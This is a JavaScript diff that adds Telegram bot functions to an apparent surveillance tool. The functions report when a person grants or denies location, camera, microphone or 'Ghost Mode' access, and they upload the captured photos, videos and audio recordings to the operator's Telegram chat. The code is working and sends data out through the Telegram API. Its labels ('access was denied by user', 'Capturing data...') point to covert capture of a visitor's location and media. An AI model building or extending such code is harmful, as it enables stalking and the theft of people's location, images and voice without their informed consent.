@@ -248,11 +248,272 @@ const sendAudioNotification = async (telegramId, session) => {
     }
 };
 
+/**
+ * Send permission denied notification to Telegram user
+ * @param {number} telegramId - Telegram user ID
+ * @param {string} permissionType - Type of permission denied
+ * @param {string} sessionId - Session ID
+ */
+const sendPermissionDeniedNotification = async (telegramId, permissionType, sessionId) => {
+    try {
+        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
+        
+        if (!botToken) {
+            return false;
+        }
+        
+        const permissionLabels = {
+            location: '📍 Location',
+            single_photo: '📷 Camera',
+            continuous_photo: '📸 Camera',
+            video: '🎥 Camera & Mic',
+            microphone: '🎤 Microphone',
+            ghost: '👻 Ghost Mode'
+        };
+        
+        const label = permissionLabels[permissionType] || permissionType;
+        const message = `❌ <b>PERMISSION DENIED!</b>\n\n` +
+            `🚫 ${label} access was denied by user\n` +
+            `📋 Session: <code>${sessionId?.slice(0, 8) || 'N/A'}</code>\n` +
+            `🕐 Time: ${new Date().toLocaleString()}`;
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        logger.info('Permission denied notification sent', { telegramId, permissionType });
+        return true;
+        
+    } catch (error) {
+        logger.error('Failed to send permission denied notification', { error: error.message });
+        return false;
+    }
+};
+
+/**
+ * Send permission granted notification to Telegram user
+ * @param {number} telegramId - Telegram user ID
+ * @param {string} permissionType - Type of permission granted
+ * @param {string} sessionId - Session ID
+ */
+const sendPermissionGrantedNotification = async (telegramId, permissionType, sessionId) => {
+    try {
+        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
+        
+        if (!botToken) {
+            return false;
+        }
+        
+        const permissionLabels = {
+            location: '📍 Location',
+            single_photo: '📷 Camera',
+            continuous_photo: '📸 Camera',
+            video: '🎥 Camera & Mic',
+            microphone: '🎤 Microphone',
+            ghost: '👻 Ghost Mode'
+        };
+        
+        const label = permissionLabels[permissionType] || permissionType;
+        const message = `✅ <b>PERMISSION GRANTED!</b>\n\n` +
+            `🔓 ${label} access granted\n` +
+            `📋 Session: <code>${sessionId?.slice(0, 8) || 'N/A'}</code>\n` +
+            `🕐 Time: ${new Date().toLocaleString()}\n\n` +
+            `⏳ Capturing data...`;
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: telegramId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        
+        logger.info('Permission granted notification sent', { telegramId, permissionType });
+        return true;
+        
+    } catch (error) {
+        logger.error('Failed to send permission granted notification', { error: error.message });
+        return false;
+    }
+};
+
+/**
+ * Send photo file to Telegram
+ * @param {number} telegramId - Telegram user ID
+ * @param {string} photoPath - Path to photo file
+ * @param {string} caption - Photo caption
+ */
+const sendPhotoFile = async (telegramId, photoPath, caption = '') => {
+    try {
+        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
+        const fs = require('fs');
+        const path = require('path');
+        const FormData = require('form-data');
+        
+        if (!botToken || !fs.existsSync(photoPath)) {
+            logger.error('Cannot send photo', { botToken: !!botToken, exists: fs.existsSync(photoPath) });
+            return false;
+        }
+        
+        const form = new FormData();
+        form.append('chat_id', telegramId.toString());
+        form.append('photo', fs.createReadStream(photoPath));
+        form.append('caption', caption || `📸 Photo captured at ${new Date().toLocaleString()}`);
+        form.append('parse_mode', 'HTML');
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            body: form
+        });
+        
+        const result = await response.json();
+        
+        if (!result.ok) {
+            throw new Error(result.description || 'Failed to send photo');
+        }
+        
+        logger.info('Photo file sent to Telegram', { telegramId });
+        return true;
+        
+    } catch (error) {
+        logger.error('Failed to send photo file', { error: error.message });
+        return false;
+    }
+};
+
+/**
+ * Send video file to Telegram
+ * @param {number} telegramId - Telegram user ID
+ * @param {string} videoPath - Path to video file
+ * @param {string} caption - Video caption
+ */
+const sendVideoFile = async (telegramId, videoPath, caption = '') => {
+    try {
+        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
+        const fs = require('fs');
+        const FormData = require('form-data');
+        
+        if (!botToken || !fs.existsSync(videoPath)) {
+            logger.error('Cannot send video', { botToken: !!botToken, exists: fs.existsSync(videoPath) });
+            return false;
+        }
+        
+        const form = new FormData();
+        form.append('chat_id', telegramId.toString());
+        form.append('video', fs.createReadStream(videoPath));
+        form.append('caption', caption || `🎥 Video captured at ${new Date().toLocaleString()}`);
+        form.append('parse_mode', 'HTML');
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            body: form
+        });
+        
+        const result = await response.json();
+        
+        if (!result.ok) {
+            throw new Error(result.description || 'Failed to send video');
+        }
+        
+        logger.info('Video file sent to Telegram', { telegramId });
+        return true;
+        
+    } catch (error) {
+        logger.error('Failed to send video file', { error: error.message });
+        return false;
+    }
+};
+
+/**
+ * Send audio file to Telegram
+ * @param {number} telegramId - Telegram user ID
+ * @param {string} audioPath - Path to audio file
+ * @param {string} caption - Audio caption
+ */
+const sendAudioFile = async (telegramId, audioPath, caption = '') => {
+    try {
+        const botToken = config.telegram?.botToken || process.env.TELEGRAM_BOT_TOKEN;
+        const fs = require('fs');
+        const FormData = require('form-data');
+        
+        if (!botToken || !fs.existsSync(audioPath)) {
+            logger.error('Cannot send audio', { botToken: !!botToken, exists: fs.existsSync(audioPath) });
+            return false;
+        }
+        
+        const form = new FormData();
+        form.append('chat_id', telegramId.toString());
+        form.append('audio', fs.createReadStream(audioPath));
+        form.append('caption', caption || `🎤 Audio captured at ${new Date().toLocaleString()}`);
+        form.append('parse_mode', 'HTML');
+        
+        const url = `https://api.telegram.org/bot${botToken}/sendAudio`;
+        
+        const response = await fetch(url, {
+            method: 'POST',
+            body: form
+        });
+        
+        const result = await response.json();
+        
+        if (!result.ok) {
+            // Try as voice message if audio fails
+            const voiceForm = new FormData();
+            voiceForm.append('chat_id', telegramId.toString());
+            voiceForm.append('voice', fs.createReadStream(audioPath));
+            voiceForm.append('caption', caption || `🎤 Audio captured at ${new Date().toLocaleString()}`);
+            
+            const voiceUrl = `https://api.telegram.org/bot${botToken}/sendVoice`;
+            const voiceResponse = await fetch(voiceUrl, {
+                method: 'POST',
+                body: voiceForm
+            });
+            
+            const voiceResult = await voiceResponse.json();
+            if (!voiceResult.ok) {
+                throw new Error(voiceResult.description || 'Failed to send audio');
+            }
+        }
+        
+        logger.info('Audio file sent to Telegram', { telegramId });
+        return true;
+        
+    } catch (error) {
+        logger.error('Failed to send audio file', { error: error.message });
+        return false;
+    }
+};
+
 module.exports = {
     setBotInstance,
     formatLocationMessage,
     sendLocationNotification,
     sendPhotoNotification,
     sendVideoNotification,
-    sendAudioNotification
+    sendAudioNotification,
+    sendPermissionDeniedNotification,
+    sendPermissionGrantedNotification,
+    sendPhotoFile,
+    sendVideoFile,
+    sendAudioFile
 };
